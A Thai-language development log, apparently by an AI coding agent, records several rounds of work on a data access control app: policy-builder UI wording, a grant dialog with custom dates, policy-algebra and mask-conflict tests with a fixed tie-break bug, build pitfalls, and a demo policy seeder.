เหตุผลที่เลือกวางคำไว้**ระหว่างแถว** ไม่ใช่เขียนอธิบายไว้ข้างบนอย่างเดียว: คำถามนี้เกิดขึ้นตอนที่คนกำลังกดเพิ่มแถวที่สอง ซึ่งเป็นตอนที่ข้อความข้างบนถูกอ่านผ่านไปแล้ว · และเป็น **ตัวอักษร ไม่ใช่สี** คนที่แยกฟ้ากับเทาไม่ออก หรือใช้ screen reader ก็ยังอ่านได้ว่า "or"

**หน้าตาจริงหลัง build** (`/policies/new` กด Add สองครั้งทุกช่อง):
```
Anyone who is  [ANY OF THESE]
  [ in the group ▾ ] [ name ]
  OR ────────────────────────
  [ in the group ▾ ] [ name ]

And whose attributes say  [ALL OF THESE]
  [ branch ] [ is ▾ ] [ FINANCE ]
  AND ───────────────────────
  [ branch ] [ is ▾ ] [ FINANCE ]

And only during  [ANY OF THESE]
  [ weekdays ▾ ] 08:00 to 18:00  Asia/Bangkok
  OR ────────────────────────
```

`SubjectBuilder.test.tsx` — **8 tests ใหม่** ที่ assert ว่าคำบนจอตรงกับที่ engine หมายถึง: ป้ายของสองรายการต้องต่างกัน, สองแถวต้องมีคำคั่น **หนึ่งคำพอดี** (สองคำแปลว่ามีคำห้อยอยู่เหนือแถวแรก), แถวเดียวต้องไม่มีคำคั่น, คำต้องโผล่ **ทันทีที่กด Add who** ไม่ใช่ตัดสินตอนเปิดฟอร์ม, และตอนที่ทั้งสองรายการว่างก็ยังต้องแยกออกจากกันได้ด้วยป้าย

**🪤 กับดัก — test ที่ render `SubjectBuilder` ต้องมี router ครอบ** ข้างในมี `ExpressionNote` ที่ render `<Link to="/docs/expressions">` → ถ้าไม่ครอบ `<MemoryRouter>` จะล้มทั้งไฟล์ด้วย `Cannot destructure property 'basename' of ... as it is null` (`PolicyBuilderPage.test.tsx` ครอบไว้อยู่แล้ว ลอกมาได้)

---

### AH.3 เทสต์ data policy ที่ชนกัน 10 ตัว — แล้วเจอบั๊กจริงที่ไม่ใช่เทสต์ผิด

ก่อนเขียนได้ไล่ดูของเดิมก่อน `DataPolicyCompositionTest` มีเคสอยู่ 30+ แล้ว แต่**ไม่มีเคสที่ mask คนละ function ชนกันบน column เดียวผ่าน engine จริง** มีแต่เทียบ `MaskStrength.rank()` ตรง ๆ · nested class ใหม่ `MaskConflicts` เติมส่วนที่ขาด:

| test | คุม |
|---|---|
| `deeperLayerMayTighten` / `deeperLayerMayNotWeaken` | **FR-3.1.4** — ชั้นล่างเพิ่มความเข้มได้ ผ่อนไม่ได้ · ตัวหลังคือเคสอุบัติเหตุ: ถ้าพัง คนที่เขียน policy ระดับ table ได้ จะลด `NULLIFY` ทั้งองค์กรให้เหลือ partial ได้ และ **query ยังสำเร็จ** ไม่มีจอไหนฟ้อง |
| `theWholeRankingHolds` | ไล่ทุกคู่ที่ติดกันในลำดับ **ทั้งสองทิศ** |
| `conditionalNeverDisplacesAFunction` | `CONDITIONAL` อาจเลือกไม่ mask เลย ห้ามให้มันเบียดของที่ mask เสมอ |
| `threeWayCollisionLeavesOne` | สาม policy บน column เดียว เหลือ mask ใบเดียว |
| `theWinnerIsTheOneOnTheRecord` | **FR-5.4** — ชื่อ policy ที่ติดมากับ mask ต้องเป็นใบที่ชนะ |
| `tiesAreOrderIndependent` | เสมอกันแล้วต้องได้ผลเดิมไม่ว่ามาลำดับไหน |
| `hideBeatsMask` / `hideBeatsMaskFromEitherSide` | hide ชนะ mask เสมอ และต้อง**ไม่**โผล่ใน `columnMasks` ด้วย (ไม่งั้น SQL จะอ้างถึง column ที่ไม่อยู่ใน projection) |
| `collisionIsScopedToItsColumn` | ชนที่ column หนึ่ง ห้ามกระเทือน column อื่น |

> ลำดับความเข้มใน test เขียนเป็น `List` ไว้เอง **ไม่ได้อ่านจาก `MaskStrength`** เพราะ test ที่ไปถามตัวที่มันกำลังตรวจว่าคิดยังไง จะผ่านทุกอย่างที่ตัวนั้นคิด

#### 🐛 `tiesAreOrderIndependent` ล้ม — และมันคือบั๊กจริง

```
expected: ac0a2da2-be48-3a5e-8f44-2617ce58f753
 but was: 475b2f89-6fcd-311c-acd1-3755e1736481
```

`PolicyEngine.stricter()` เขียน comment ไว้ว่า *"Ties keep the incumbent, so composition is order-independent"* แล้ว `return incumbent` — **ซึ่งไม่ใช่ order-independence มันแค่หน้าตาเหมือน** · ตัว mask ออกมาเหมือนกันจริง SQL เลยปลอดภัย แต่ **ชื่อ policy ที่ถูกบันทึกไว้บนนั้นเดินตามลำดับที่โหลดมา** → หน้าจออธิบาย (FR-5.4) จะบอกชื่อ policy คนละใบกันเมื่อ refresh และส่ง owner ไปแก้ใบที่โหลดมาก่อนโดยบังเอิญ

แก้ให้ tie-break เป็น **total order**:
1. ชั้นที่**กว้างกว่า**ชนะ — เพราะมันคือใบที่ยังบังคับ mask นี้อยู่ดีถ้าอีกใบถูกลบ (`ScopeLevel.ordinal()` · ORG = 0 = กว้างสุด · ชั้นที่ไม่มีค่าไม่มีวันชนะ)
2. เสมออีกก็ตัดด้วย policy id

ตรวจแล้วว่าไม่ไปกวน `maskNamesItsLayer` (policy ใบเดียว) และ `unconditionalBeatsConditionalOfEqualStrength` (กติกาเรื่อง condition ตัดสินไปก่อนถึงบรรทัดนี้)

**ผลรัน:** `dac-engine` **267 → 277** · full unit suite **470 → 480** · `./mvnw -am -pl backend/dac-service test` → **exit 0 ทุกโมดูล** (`dac-compiler-sql` golden file ไม่กระเทือน)

---

### AH.4 🪤 กับดักที่เสียเวลาไปรอบนี้

1. **Maven รันด้วย JDK ผิดเงียบ ๆ** — `JAVA_HOME` ที่ติดมากับเครื่องเป็น Java 11 ถ้าไม่ตั้งเอง build จะตายที่ `dac-spec` ด้วย `PluginContainerException` 60 บรรทัดที่บังสาเหตุจริงไว้ สาเหตุจริงคือ `jsonschema2pojo ... class file version 61.0, this version ... up to 55.0`
   ```bash
   export JAVA_HOME="/c/Users/Sakan P/Desktop/Data Access Control App/.tools/jdk-21.0.12.1+1"
   ```
   ⚠️ ต้องเป็น **path แบบ POSIX** · ถ้าใช้ `MSYS_NO_PATHCONV=1 JAVA_HOME="$(pwd -W)/..."` จะได้ `Could not find or load main class org.codehaus.plexus.classworlds.launcher.Launcher` แทน
2. **`./mvnw` อยู่ที่ราก repo ไม่ใช่ใน `backend/`**
3. **heredoc ของ bash พัง** เมื่อเนื้อหาข้างในยาวและมี quote (บล็อก Java 167 บรรทัดทำ `unexpected EOF while looking for matching ''`) → เขียนสคริปต์ลง scratchpad ด้วย Write แล้ว `python <path>` (กับดักเดิมที่บันทึกไว้แล้ว ยังโดนอยู่)

---

### AH.5 ไฟล์ที่แตะรอบนี้

| ไฟล์ | อะไร |
|---|---|
| `frontend/app/src/components/chips.tsx` | เอา outline ออกจากทั้งสอง map · `bordered={bordered ?? modern}` |
| `frontend/app/src/pages/catalog/facets.tsx` | `bordered={false}` หนึ่งบรรทัด |
| `frontend/app/src/pages/policies/SubjectBuilder.tsx` | `JoinTag` / `SectionHeading` / `JoinRow` + เดินสาย or/and เข้าทั้งสี่รายการ |
| `frontend/app/src/pages/policies/SubjectBuilder.test.tsx` | **ใหม่** — 8 tests |
| `backend/dac-engine/src/test/.../DataPolicyCompositionTest.java` | **+167 บรรทัด** — nested class `MaskConflicts` 10 tests |
| `backend/dac-engine/src/main/.../PolicyEngine.java` | tie-break ของ mask เป็น total order (breadth → policy id) |

---

## รอบก่อนหน้า — **Grant กำหนดวันเองได้ (พิมพ์จำนวนวัน / ตั้ง Start–End ล่วงหน้า)** · และ **ชิปทั้งแอปหนาขึ้นจากที่เดียว**

> โจทย์รอบนี้มาสามอัน: *"For how long ตอน Direct access ต้องใส่เลขเองได้ไหม"* · *"แล้วกำหนดล่วงหน้า Start date end date ได้ไหม"* · *"ทำเสร็จแล้วทดสอบให้ดีด้วยนะ"* แล้วระหว่างทางมีอีกอัน: *"tag สีประมาณนี้มันดูบางๆ ไม่สวยอะ ลองปรับให้ดีกว่านี้หน่อย"*

### AG.1 `GrantDialog` — ช่อง **For how long** พิมพ์เลขเองได้ และสลับเป็น **Between** ตั้งวันล่วงหน้าได้

เดิมมีแต่ชิป 5 อัน (`7 / 30 / 90 / 180 วัน` และ `No expiry`) ซึ่งแปลว่า "45 วัน" เขียนไม่ได้เลย และ "เปิดให้ใช้วันที่ 1 เดือนหน้า" ก็เขียนไม่ได้ ทั้งที่ `GrantRequest` ฝั่ง backend รับ `validFrom` มาตั้งแต่แรกและ `NewGrant` ใน `src/api/access.ts` ก็ประกาศ `validFrom?: string | null` ไว้แล้ว — **ไม่ต้องแก้ API หรือ backend สักบรรทัด** ช่องกรอกอย่างเดียวที่หายไป

| โหมด | หน้าตา | ส่งอะไรไป API |
|---|---|---|
| `duration` (ค่าเริ่มต้น) | ชิป 5 อันเดิม **+ ช่อง `or [__] days`** (`aria-label="Number of days"`) | `validFrom: null` · `validUntil = now + N วัน` |
| `dates` | `Starts` / `Ends` แบบ `datetime-local` สองช่อง | ส่ง instant ทั้งสองตัวตามที่กรอก (ว่างได้ทั้งคู่) |

สลับโหมดด้วยลิงก์ข้อความเดียว `Set start and end dates` ⇄ `Use a duration` และใต้ control มีบรรทัดสรุปที่เปลี่ยนตามสิ่งที่กรอกจริง — ถ้ากรอกผิดบรรทัดนี้กลายเป็นข้อความสีแดงและปุ่ม Grant ถูกปิด

**สิ่งที่บรรทัดสรุปตั้งใจบอกให้ได้:** ถ้า `Starts` เป็นอนาคต มันเขียนว่า *"Opens … — until then the grant exists and grants nothing"* เพราะสิ่งเดียวที่คนตั้งเวลาล่วงหน้าพลาดได้โดยไม่รู้ตัวคือคิดว่ากดปุ่มแล้วสิทธิ์มีผลทันที

**บั๊กที่เจอระหว่างทางและแก้ไปด้วย:** helper เดิม (`expiryFrom`) คืน `null` เมื่อจำนวนวันเป็น `0` ซึ่ง API อ่านว่า **"ไม่มีวันหมดอายุ"** — พิมพ์ผิดตัวเดียวได้ grant ที่กว้างที่สุดเท่าที่ระบบให้ได้ ตอนนี้ `0` เป็นข้อความปฏิเสธ (`Give a number of days above zero, or pick No expiry.`) และปุ่มถูกปิด

### AG.2 ทดสอบ — 9 unit tests + **7 checks กับระบบที่รันอยู่จริง**

`GrantDialog.test.tsx` (ใหม่, 9 tests) ใช้ `fireEvent` ล้วน เพราะ `@testing-library/user-event` ไม่ได้ติดตั้งในเรโปนี้ · mock เฉพาะ `fetchPrincipals` · fixture ใช้ `analyst_a@example.com` กับ UUID ปลอม ไม่มีอะไรที่ใช้ยิงของจริงได้

เคสที่ควรรู้ว่าเขียนไว้ทำไม:
- **พิมพ์ 45 วัน** — assert *ช่วงเวลา* (44.9–45.1 วัน) ไม่ใช่ instant เป๊ะๆ เพราะ assert instant คือการ assert นาฬิกา ไม่ใช่ assert สิ่งที่ช่องกรอกสัญญาไว้
- **start = end** — ต้องถูกปฏิเสธ ให้ตรงกับ `GrantStore` ที่ใช้ `isAfter` ไม่ใช่ `!isBefore`
- **ตั้ง start อนาคตโดยไม่ใส่ end** — ต้องยังเป็น open-ended (`validUntil: null`) ไม่ใช่ถูกเติมค่าให้เอง

แล้วยิงกับ backend ที่รันอยู่จริง (`grant-schedule.mjs`, 7 checks ผ่านหมด) ซึ่งพิสูจน์สิ่งที่ unit test พิสูจน์ไม่ได้:

| check | ผล |
|---|---|
| grant ที่เปิดเดือนหน้า **ถูกเก็บพร้อม instant ทั้งสองตัว** | ✅ |
| **และวันนี้ยังไม่ให้สิทธิ์อะไรเลย** | ✅ |
| **และตอนที่ยังไม่เปิด มันไม่ส่ง reason เข้า engine เลยแม้แต่อันเดียว** | ✅ (0 reasons) |
| grant ที่ window เปิดอยู่ ยังถูก ORG gate ปฏิเสธ (FR-3.1.4) | ✅ |
| **แต่มันเข้าถึง engine จริงในฐานะ `TABLE` reason** | ✅ |
| end ก่อน start → server ตอบ **400** | ✅ |
| window ยาวศูนย์ (start = end) → server ตอบ **400** | ✅ |

> check ที่ 3 คือตัวที่สำคัญ และตอนแรก**ไม่ได้เขียนไว้** — เพราะ `analyst_b` ถูกปฏิเสธทั้งสองทางอยู่แล้ว การเทียบ decision เฉยๆ จึงไม่ได้พิสูจน์อะไรเลย สิ่งที่พิสูจน์ได้คือ engine **ไม่เคยพิจารณา grant นั้น** ซึ่งต้องดูที่ `reasons`

### AG.3 ชิป — ย้ายน้ำหนักมาไว้ที่เดียว (`src/components/chips.tsx`) แล้วทั้งแอปได้พร้อมกัน

ชิปเดิมบางจนแทบไม่เห็น และสาเหตุมีสามอย่าง ไม่ใช่อย่างเดียว:
1. `tw:opacity-70` ครอบทั้งชิปสำหรับ facet ที่ **inherited** — ซึ่งจางทั้งพื้นและ**ตัวหนังสือ** และ inherited คือส่วนใหญ่ของแถว แปลว่าแถวส่วนใหญ่คือแบบที่จาง
2. `pillSizes.sm` ของ design system **ไม่มี font-weight** เลย
3. พื้นระดับ 50 คู่กับเส้นขอบระดับ 200 = เส้นขอบหายไปกับพื้นหลัง

แก้เป็น: พื้น **100** · เส้นขอบ **300** · `font-medium` · และ inherited เปลี่ยนจาก opacity เป็น **พื้นระดับ 50 แต่ตัวหนังสือเต็มความเข้ม** (ลูกศร ↑ บอกความต่างอยู่แล้ว ไม่ต้องจ่ายด้วยความอ่านออก)

**ไม่แตะ `ui-core-components` เลย** — `Badge` merge `props.className` **เป็นอันสุดท้าย** ผ่าน `cx` (`extendTailwindMerge`) คลาสของเราจึงชนะ `bg`/`text`/`outline` ของ design system ได้โดยไม่ต้อง fork (ทดลองยืนยันก่อนเขียนจริง ไม่ได้เดา)

สเกล utility **กลับด้านใน dark mode** (`utility-blue-100` → `blue-900`) การขยับ 50→100 และ 200→300 จึงเป็นการขยับ**ทิศเดียวกัน**ทั้งสองธีม ไม่ใช่ขยับเข้าหาพื้นหลังในธีมใดธีมหนึ่ง

**แล้วเจอปัญหาที่ตัวเองสร้าง:** พอชิป facet หนาขึ้น badge ที่อยู่ข้างๆ (`SERVICE`, `Tier2`, `draft`, `subscription`, …) กลายเป็นดูบางผิดที่ — แถวหนึ่งต้องอ่านเป็นแถวเดียว ไม่งั้นดูเหมือนทำพลาด แต่ badge พวกนี้มี **~60 จุดใน 17 ไฟล์** การไล่ใส่ `className` ทีละจุดคือหนี้ที่แตะไม่ได้

ทางที่เลือก: `src/components/chips.tsx` ถือ `CHIP_WEIGHT` / `CHIP_INHERITED` / `badgeWeight()` และ component `Chip` ที่ห่อ `Badge` แล้วทุกหน้า import ว่า `import { Chip as Badge } from '…/components/chips'` — **call site ไม่ต้องแก้สักจุด** และน้ำหนักทั้งแอปเปลี่ยนหรือถอดได้จากไฟล์เดียว

`type="modern"` **ถูกยกเว้นโดยตั้งใจ** — มันคือชิปขาวขอบบาง ที่ชื่อ owner ใช้อยู่ การใส่สีให้ชื่อคนคือการเอาชื่อคนไปแข่งกับ governance facet ที่อยู่ข้างๆ

**พิสูจน์ด้วยตา** (Playwright, 2x) ไม่ใช่แค่เทสต์ผ่าน: หน้า asset ชิป domain มีพื้นและขอบจริงแล้ว · หน้า Policies ชิป `draft` / `subscription` / scope อ่านออกแล้ว · หน้า Governance ชิป `one value only` เหมือนกัน · และ probe computed style ยืนยันว่า facet ที่ `direct` ทุกตัวได้พื้น 100 เท่ากัน (ที่ตาเห็นว่าอันหนึ่งจางกว่าในภาพแรกคือ antialiasing ของข้อความที่ถูก truncate ไม่ใช่ของจริง)

### AG.4 กับดักที่เสียเวลาไปรอบนี้ — เขียนไว้กันโดนซ้ำ

- **`vite build` เปล่าๆ ทำ bundle ของ prod พัง** — ต้อง `MSYS_NO_PATHCONV=1 VITE_BASE=/Arak/ npx vite build` เสมอ ไม่งั้น `index.html` ชี้ `assets/…` แบบไม่มี prefix แล้วหน้าเว็บที่ `:8090/Arak/` ขึ้นขาวเปล่า (404 ทั้ง js และ css) — **อาการเหมือน backend ตาย แต่ backend ปกติดี**
- jar ที่เสิร์ฟ `dist` **cache `index.html` ไว้** → build ใหม่แล้วต้อง restart backend ไม่งั้นได้ index เก่าที่ชี้ hash ที่ถูกลบไปแล้ว
- script ที่ `import { chromium } from 'playwright'` **ต้องอยู่ใน `frontend/app`** เท่านั้น อยู่ที่ scratchpad หรือ repo root = `ERR_MODULE_NOT_FOUND`
- heredoc ของ bash **ทำ `\n` ใน string literal ของ JS พัง** แม้จะ quote heredoc แล้วก็ตาม → script ที่มี escape ให้เขียนด้วย Write tool แล้วค่อยรัน

### AG.5 สิ่งที่สังเกตเห็นแต่ **ยังไม่แก้** (ต้องยืนยันก่อน)

หน้า `demo-pg.salesdb.sales.customer` แสดง domain สามชิป (`Finance`, `Finance / Risk`, `… / Risk / Credit`) และ probe แล้วพบว่า **ทั้งสามตัวมี `direct: true`** (tooltip เขียน "applied here" หมด) — ตาม FR-2A.2 ancestor ที่ถูกกางออกมาควรเป็น `is_direct = false` เหลือตัวล่างสุดตัวเดียวที่ `true`

ยังไม่แก้เพราะเป็นเรื่องของ materializer ฝั่ง backend ไม่ใช่เรื่องสี และต้องไปดู `asset_facet` จริงก่อนว่าเป็นที่ข้อมูลหรือที่ mapper — **แต่ถ้าเป็นบั๊กจริง มันทำให้ "tag นี้มาจากไหน" ตอบผิด ซึ่งคือคำถามที่ FR-2A.1 มีอยู่เพื่อจะตอบ**

### AG.6 ไฟล์ที่แตะรอบนี้

| ไฟล์ | อะไร |
|---|---|
| `frontend/app/src/components/chips.tsx` | **ใหม่** — `CHIP_WEIGHT` / `CHIP_INHERITED` / `badgeWeight()` / `Chip` |
| `frontend/app/src/pages/catalog/GrantDialog.tsx` | โหมด duration ⇄ dates, ช่องพิมพ์จำนวนวัน, `windowFrom()` |
| `frontend/app/src/pages/catalog/GrantDialog.test.tsx` | **ใหม่** — 9 tests |
| `frontend/app/src/pages/catalog/facets.tsx` | เอา `opacity-70` ออก, ใช้ `badgeWeight()` |
| อีก 17 ไฟล์ใน `src/pages/**` | เปลี่ยนบรรทัด import เป็น `Chip as Badge` อย่างเดียว ไม่แตะ call site |

---

## รอบก่อนหน้า — **พีชคณิตของ policy พิสูจน์เป็นชุด** · Doc syntax 1 หน้า · และ **ตัวอย่างทุกอันกลายเป็น policy จริงใน DB**

> โจทย์รอบนี้มาสามชั้น: *"ทดสอบให้ครบทุก Case · อย่าลืม and/or · หรือมีหลาย policy conflict กัน Union / Compliment / Intersection · ทั้ง Subscription, ให้ access ตรงใน UI, Data policy"* แล้วตามด้วย *"เขียนตัวอย่างการ Config กับ Syntax ที่รองรับใน Doc 1 หน้า เป็น link กดไปดูได้"* และปิดท้าย *"ทำตัวอย่างทุกแบบไปใน policy จริงเลยนะ จะเอาไป demo"*

### AF.1 `PolicyAlgebraTest` — 34 tests ที่เขียนคำตอบเป็น **เซต** ไม่ใช่ boolean

ชุดเดิมพิสูจน์ทีละคน (`analyst_a` ได้ / ไม่ได้) ซึ่งจับบั๊กประเภท "union กลายเป็น intersection" **ไม่ได้** เพราะทั้งสองแบบก็ตอบว่าคนคนนี้ผ่านเหมือนกัน รอบนี้เปลี่ยนวิธี: ทุกเคสยิง **ประชากร 5 คน** ผ่าน engine แล้ว assert **เซตของคนที่ผ่านทั้งเซต** ด้วย `containsExactlyInAnyOrder` — บั๊กที่พลาดไปคนเดียวไม่มีที่ซ่อน

ประชากรจงใจจัดให้ team / role / clearance / country **ตัดเซตคนละแบบ** ทั้งสี่แกน ถ้าไม่จัดแบบนี้ union กับ intersection อาจให้คำตอบเดียวกันโดยบังเอิญ แล้วเทสต์จะเขียวไม่ว่า engine ทำอันไหน

| nested class | พิสูจน์อะไร | tests |
|---|---|---|
| `Union` | policy ชั้นเดียวกัน = **OR** · idempotent (A∪A=A) · **commutative** (policy มาจาก query ที่ไม่การันตีลำดับ — ถ้าข้อนี้พังเมื่อไหร่ สิทธิ์จะขึ้นกับอารมณ์ของ database) · `principals` list ในใบเดียว = union เท่ากับแยกสองใบ · union ว่าง = ปิด | 5 |
| `Intersection` | policy ต่างชั้น = **AND** · **`localCannotWiden`** (ORG=Finance ∩ TABLE=analyst ทุกคน → `{fin_l1, fin_l2}` **ไม่ใช่** `{…, eng_sg}`) · intersection ว่าง = ไม่ให้ใครเลย ไม่ตกกลับไปข้างใดข้างหนึ่ง · ORG∩SCHEMA∩TABLE (ชั้นกลางคือชั้นที่ implementation แบบ "global vs local" มักข้าม) · ชั้นที่ไม่มี policy = **งดออกเสียง ไม่ใช่ปิด** | 7 |
| `Complement` | DENY = **ลบออก** · DENY ที่ COLUMN ลบ ALLOW ที่ ORG ได้ (deny ชนะทุกชั้น) · **`exemptionIsComplementOfComplement`** — `(A \ D) ∪ (A ∩ E)` และ exemption ที่ชี้คนที่ ALLOW ไม่เคยถึง **ไม่ทำให้เขาเข้าได้** (exemption ปลดจาก DENY ไม่ใช่ตัวให้สิทธิ์) · DENY ลอยๆ ไม่เปิดประตู (complement ของศูนย์คือศูนย์ ไม่ใช่ทุกอย่าง) · **`orderOfOperations`** — `(A1 ∪ A2) \ D` ไม่ใช่ `(A1 \ D) ∪ A2` | 6 |
| `Selectors` | ฝั่ง asset: `or` / `and` / `not` · **De Morgan** `not(A or B) == (not A) and (not B)` (+ assert ว่าทั้งสองข้างไม่ว่าง ไม่งั้น "เท่ากันเพราะพังเหมือนกันทั้งคู่" ก็ผ่าน) · **distributivity** · `contains` ครอบลูกหลาน / `eq` ไม่ครอบ (แผนข้อ 4a) | 6 |
| `DataAlgebra` | เซต column ที่ถูก mask = **union** ข้าม policy · mask สองอันบน column เดียว **join ที่อันเข้มกว่า** ไม่ว่าอยู่ชั้นไหน (NULLIFY ชนะ PARTIAL ที่ลึกกว่า) · row filter **intersect** (ทั้งสอง predicate ต้องรอด — ถ้า filter ที่ลึกกว่าแทนที่อันตื้นได้ ทุก row set ในระบบจะกว้างขึ้นเงียบๆ) · hidden column union · **monotone**: เพิ่ม data policy แล้วต้องไม่เห็นมากขึ้น | 6 |
| `Mixed` | decision ที่ถูกปฏิเสธ **ไม่พก mask/filter/hide ติดมา** (ถ้าพกมา = บอกคนที่เข้าไม่ได้ว่ามี column อะไรและอันไหน sensitive) · data policy 3 ใบโดยไม่มี subscription = ยังปฏิเสธ · mask เป็นรายคน ไม่ใช่รายตาราง · **`orderIndependent`** — 7 policy เรียงหน้า/เรียงหลัง ให้ allowed, masks, functions, hidden **และ cache key เดียวกัน** | 4 |

รันแรกล้มจริง 5 เคส — 4 เคสเป็นบั๊กของเทสต์เอง (เทียบชื่อ table สั้นกับ FQN เต็ม) และ **1 เคสเป็นความคาดหวังของผมที่ผิด ไม่ใช่ engine ผิด**: `localCannotWiden` เดิมตั้ง ORG=Finance ∩ TABLE=Engineering แล้วคาด `{fin_l1, fin_l2}` ทั้งที่ intersection มันว่างจริงๆ · แก้โดยให้ local เป็น **superset** (`role=analyst`) เพื่อให้คำตอบไม่ว่าง — จงใจ เพราะคำตอบว่างมันสอดคล้องกับกรณีที่ engine **โยน local policy ทิ้ง** ด้วย ซึ่งเป็นบั๊กคนละตัวที่อาการเหมือนกันเป๊ะ

### AF.2 `GrantCompositionIT.AgainstDataPolicies` — ขา "ให้ access ตรงใน UI" ตัดกับ data policy

4 tests · เคสที่ห้ามพลาดที่สุดคือ **`grantIsNotAnUnmask`**: activate data policy ที่ nullify `email` → grant CUSTOMER ให้ `analyst_a` ตรงๆ → ต้องเข้าได้ **และ `email` ต้องยัง `NULLIFY` อยู่**

ที่ต้องมีเทสต์ข้อนี้เพราะ UI เรียกทั้งสองอย่างว่า "access" เหมือนกัน และถ้าพลาดคือ **ปุ่มคลิกเดียวที่คนกดบ่อยที่สุด ถอด masking ออกจาก PII เงียบๆ โดย query สำเร็จและไม่มี error ที่ไหนเลย** · อีกสามข้อ: grant รับ row filter ที่มีอยู่แล้วมาด้วย · grant ตรง + grant ผ่านทีม = union (access เดียว mask เดียว ไม่ใช่สองชุด) · revoke ใบหนึ่งแล้วอีกใบยังอยู่ (ขา complement และเป็นข้อที่ owner พลาดบ่อย)

### AF.3 Doc syntax 1 หน้า — `/docs/expressions` (กดจากช่อง expression ได้)

- `ExpressionReference` + `reference.json` อยู่ใน **jar ของ engine** — หน้าเว็บ render สิ่งที่ backend ส่งมาล้วนๆ **ไม่มี example / operator / ชื่อ facet ตัวไหนเขียนซ้ำในฝั่ง front end** แปลว่าหน้านี้อธิบายภาษาที่ deployment นี้รันอยู่จริงเสมอ
- `ExpressionResource` ใหม่: `GET /v1/expressions/reference` (เอกสาร) · `POST /v1/expressions/validate` (parser ตัวเดียวกับตอน save)
- `ExpressionReferenceTest` **รันเอกสาร**: ทุก example × ทุก case ยิงผ่าน evaluator จริง, ทุกอันต้องผ่าน `validate`, ทุกชื่อใน root ที่เป็น closed list ต้องเป็นชื่อที่ parser resolve ได้, และทุกอันใน `rejected` ต้องถูกปฏิเสธจริง → **example ที่เลิกเป็นจริง CI ล้มก่อนผู้ใช้อ่าน**
- ในหน้า: กล่อง **Try one** พิมพ์ทดสอบกับ parser จริงได้ · ทุก example มีปุ่ม *Check against the engine* · แยก **error (save ไม่ผ่าน)** ออกจาก **warning (save ผ่าน แล้วไม่ให้สิทธิ์ใคร)** ให้เห็นชัด — สองเรื่องนี้คนละเรื่องกันสำหรับคนอ่าน
- ช่อง expression ใน builder: ลิงก์ *Syntax and worked examples* + validate สดแบบ debounce 400ms · ลิงก์และ verdict อยู่ **นอก** `<label>` เพื่อไม่ให้คลิกเดียวมีสองความหมาย และเพื่อให้ verdict โผล่/หายโดยไม่ดันช่องพิมพ์ใต้เคอร์เซอร์ · ตัว `Field` ไม่ถูกแตะเลย หน้าตาเดิมทุกพิกเซล

### AF.4 **ตัวอย่างทุกอัน = policy จริงใน DB** (`scripts/seed-example-policies.mjs`)

ตามที่สั่งว่าจะเอาไป demo · script อ่าน example **จาก service ที่รันอยู่** ไม่ใช่จากสำเนาในไฟล์ → seed ภาษาที่ engine ไม่ได้รันไม่ได้ และ example ที่เพิ่มใน reference จะโผล่มาเองรอบหน้าโดยไม่ต้องแก้ script · **idempotent** (รันซ้ำ = update ไม่ชนกับ unique key `(name, environment)`)

| ผล | |
|---|---|
| seed แล้ว | **11 ใบ** ชื่อ `example-<id>` บน `demo-pg.salesdb.sales.customer` · binding ใบละ 1 target |
| `example-row` | กลายเป็น **DATA policy + row filter** อัตโนมัติ เพราะ `POST /validate` ตอบ `rowDependent: true` และ subject rule ใช้ row ไม่ได้ (PolicyStore ปฏิเสธ) — script ทำตามที่หน้า doc แนะนำเป๊ะ |
| state | **DRAFT ทุกใบ — จงใจ** · 11 policy ACTIVE บน table เดียวกัน compose แบบ intersection (FR-5.1) → ทุกคนโดนปฏิเสธหมด แล้ว demo จะไม่เหลืออะไรให้ดู · เป็น draft มันก็ยังเป็น row จริงที่อ่านได้ / มี version / มี binding และ **impact analysis รันทีละใบผ่าน engine จริง** ซึ่งคือสิ่งที่ทำให้ demo ทีละ example ได้ · จะ activate = กดเดียวที่ lifecycle |

พิสูจน์ว่า demo เดินจริงผ่าน `GET /v1/policies/{id}/impact` — ตัวเลขตรงกับที่หน้า doc เขียนไว้:

| example | expression | ใครเปลี่ยน |
|---|---|---|
| `residency` | `user.country == asset.prop('dataResidency')` (table = TH) | `analyst_a`, `steward_c` **GAINS** · `analyst_b` (SG) ไม่ขยับ |
| `list` | `user.department in ['FINANCE','RISK']` | ทั้งสามคน GAINS |
| `grouping` | `(team=='Finance' \|\| 'auditor' in roles) && country=='TH'` | `analyst_a`, `steward_c` · `analyst_b` ไม่ขยับ |
| `typo` | `user.contry == 'TH'` | **ไม่มีใครเลย** — บทเรียน silent failure ที่ demo ให้ดูได้จริงว่า policy ที่ save ผ่าน อ่านกลับมาเหมือนที่พิมพ์ทุกตัวอักษร แล้วไม่ให้สิทธิ์ใครสักคน |

หน้า doc ลิงก์ example → policy โดย **match จากชื่อ** ไม่ได้ฝัง id ไว้ → deployment ที่ยังไม่เคยรัน seeder ก็แสดง example ตามปกติ แค่ไม่มีลิงก์ (ซึ่งเป็นความจริง) แทนที่จะลิงก์ไปหา policy ที่ไม่มีอยู่ — มีเทสต์คุมข้อนี้ข้อหนึ่ง

**วิธีรัน**
```bash
set -a && . ./.env && set +a
node scripts/seed-example-policies.mjs                                    # localhost:8080/api
ARAK_URL=http://localhost:8090/Arak/api node scripts/seed-example-policies.mjs
```

### AF.5 ไฟล์ที่เพิ่ม/แก้รอบนี้

| ไฟล์ | |
|---|---|
| `backend/dac-engine/.../ExpressionReference.java` + `resources/expressions/reference.json` | เอกสารเป็นข้อมูล อยู่ใน jar ของ engine |
| `backend/dac-engine/.../PolicyExpressionEvaluator.java` | เปิด `analyse()` ให้ตอบ rowDependent + รายชื่อ user attribute ที่อ้างถึง |
| `backend/dac-service/.../resources/ExpressionResource.java` | `/v1/expressions/reference` · `/v1/expressions/validate` |
| `backend/dac-engine/src/test/.../PolicyAlgebraTest.java` | 34 tests |
| `backend/dac-engine/src/test/.../ExpressionReferenceTest.java` | `@TestFactory` รันทุก example ในเอกสาร |
| `backend/dac-service/src/test/.../GrantCompositionIT.java` | + nested `AgainstDataPolicies` 4 tests |
| `frontend/app/src/api/expressions.ts` | typed client |
| `frontend/app/src/pages/docs/ExpressionDocsPage.tsx` (+ `.test.tsx` 5 tests) | หน้า doc |
| `frontend/app/src/pages/policies/SubjectBuilder.tsx` | ลิงก์ + inline verdict (นอก Field) |
| `frontend/app/src/App.tsx` | route `/docs/expressions` **อยู่ในกรอบ auth** — reference บอกชื่อ facet/attribute ที่องค์กรนี้ใช้จริง ไม่ใช่ของแจกคนนอก |
| `scripts/seed-example-policies.mjs` | seeder |

### AF.6 ผลรันจริงรอบนี้

| ชุด | ผล |
|---|---|
